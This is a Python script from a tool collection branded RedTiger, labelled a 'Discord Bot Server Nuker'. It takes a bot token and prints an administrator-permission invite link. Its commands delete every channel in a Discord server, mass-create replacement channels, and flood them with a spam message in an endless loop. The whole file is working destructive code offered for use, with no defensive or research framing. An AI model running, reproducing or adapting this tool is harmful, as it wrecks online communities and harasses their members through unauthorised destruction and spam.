# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import pkg_resources
except Exception as e:
   ErrorModule(e)
   
Title("Discord Bot Server Nuker")

try:
    token = input(f"{color.RED}\n{INPUT}Token Bot -> {color.RESET}")
    prefix = "!"

    discord_py_version = None
    for package in pkg_resources.working_set:
        if package.key == 'discord.py':
            discord_py_version = package.version
            break

    if discord_py_version == '1.6.0':
        pass
    else:
        print(f"{color.RED}{INFO} Installing discord.py version 1.6.0: (please put \"y\" so that it uninstalls to better reinstall){color.RESET}\n")
        os.system("pip install discord.py==1.6.0")
        time.sleep(5)

    Clear()
    import discord
    from discord.ext import commands, tasks
    from discord import Activity, ActivityType

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True  

    bot = commands.Bot(command_prefix=prefix, intents=intents)

    created_channel_ids = []

    try:
        @bot.event
        async def on_ready():
            await bot.change_presence(activity=Activity(type=ActivityType.playing, name=f"{github_tool}"))
            print(F"""{color.RED}
                ██████ ▓█████  ██▀███   ██▒   █▓▓█████  ██▀███      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                ░ ▓██▄   ▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▒██▀▀█▄     ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                ▒██████▒▒░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░██▓ ▒██▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                ░  ░     ░     ░░   ░      ░░     ░     ░░   ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                    ░     ░  ░   ░           ░     ░  ░   ░                 ░    ░     ░  ░      ░  ░   ░     
                                            ░                                                                 """)
            print("""{RED}Bot Informations:
    {RED}> Token  : {WHITE}{token}
    {RED}> Invite : {WHITE}https://discord.com/oauth2/authorize?client_id={0.user.id}&scope=bot&permissions=8
    {RED}> Name   : {WHITE}{0.user.name}  
    {RED}> Id     : {WHITE}{0.user.id}
    {RED}> Prefix : {WHITE}{prefix}
    {RED}> Status : {WHITE}Online""".format(bot, RED=color.RED, WHITE=color.WHITE, token=token, prefix=prefix))
            
            print(f"""
    {color.RED}Bot Commands:
    > {prefix}nuke {color.LIGHTRED_EX}<Channels Number>{color.RED} - {color.LIGHTRED_EX}<Channels Name>{color.RED} - {color.LIGHTRED_EX}<Message Spam>
    {color.WHITE}Delete all channels and create other channels and spam messages.{color.RED}
    > {prefix}spam_channels {color.LIGHTRED_EX}<Channels Number>{color.RED} - {color.LIGHTRED_EX}<Channels Name>{color.RED} - {color.LIGHTRED_EX}<Message Spam>
    {color.WHITE}Created channels that spam messages.{color.RED}
    > {prefix}delete_channels
    {color.WHITE}Delete all channels from the server.{color.RED}

    {color.RED}Logs:{color.RESET}""")
    except:
        ErrorToken()

    @bot.command()
    async def nuke(ctx, *, args):
        global message_to_send
        print(f"{color.RED}[>] | Command: {color.WHITE}{prefix}nuke")
        args_list = args.split("-")
        if len(args_list) != 3:
            print(f"{color.RED}[>] | Invalid Argument !")
            return
        
        try:
            number = int(args_list[0])
        except ValueError:
            print(f"{color.RED}[>] | Invalid Number !")
            return

        channel_name = args_list[1]
        message = args_list[2]

        message_to_send = message

        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{color.RED}[+] | Channel Delete: {color.WHITE}{channel.name} ({channel.id})")   
            except Exception as e:
                print(f"{color.RED}[+] | Channel Not Delete: {color.WHITE}{channel.name} ({channel.id}){color.RED} | Error: {color.WHITE}{e}")

        created_channel_ids.clear()

        guild = ctx.guild
        for i in range(number):
            new_channel = await guild.create_text_channel(f"{channel_name}")
            print(f"{color.RED}[+] | Channel Create: {color.WHITE}{channel_name}")
            await new_channel.send(message_to_send)
            print(f"{color.RED}[+] | Message Send: {color.WHITE}{message_to_send}")
            created_channel_ids.append(new_channel.id)
        send_message_loop.start()


    @bot.command()
    async def spam_channels(ctx, *, args):
        global message_to_send
        print(f"{color.RED}[>] | Command: {color.WHITE}{prefix}spam_channels")
        args_list = args.split(" - ")
        if len(args_list) != 3:
            print(f"{color.RED}[>] | Invalid Argument !")
            return
        
        try:
            number = int(args_list[0])
        except ValueError:
            print(f"{color.RED}[>] | Invalid Number !")
            return

        channel_name = args_list[1]
        message = args_list[2]

        message_to_send = message

        guild = ctx.guild
        for i in range(number):
            new_channel = await guild.create_text_channel(f"{channel_name}")
            print(f"{color.RED}[+] | Channel Create: {color.WHITE}{channel_name}")
            await new_channel.send(message_to_send)
            print(f"{color.RED}[+] | Message Send: {color.WHITE}{message_to_send}")
            created_channel_ids.append(new_channel.id)
        send_message_loop.start()


    @tasks.loop()
    async def send_message_loop():
        global message_to_send

        for channel_id in created_channel_ids:
            channel = bot.get_channel(channel_id)
            if channel:
                try:
                    await channel.send(message_to_send)
                    print(f"{color.RED}[+] | Message Send: {color.WHITE}{message_to_send}")
                except Exception as e:
                    print(f"{color.RED}[X] | Message Not Send: {color.WHITE}{message_to_send}{color.RED} | Error: {color.WHITE}{e}")


    @bot.command()
    async def delete_channels(ctx):
        print(f"{color.RED}[>] | Command: {color.WHITE}{prefix}delete_channels")
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{color.RED}[+] | Channel Delete: {color.WHITE}{channel.name} ({channel.id})")   
            except Exception as e:
                print(f"{color.RED}[+] | Channel Not Delete: {color.WHITE}{channel.name} ({channel.id}){color.RED} | Error: {color.WHITE}{e}")

        created_channel_ids.clear()
        send_message_loop.stop()
    try:
        bot.run(token)
    except:
        ErrorToken()
except Exception as e:
    Error(e)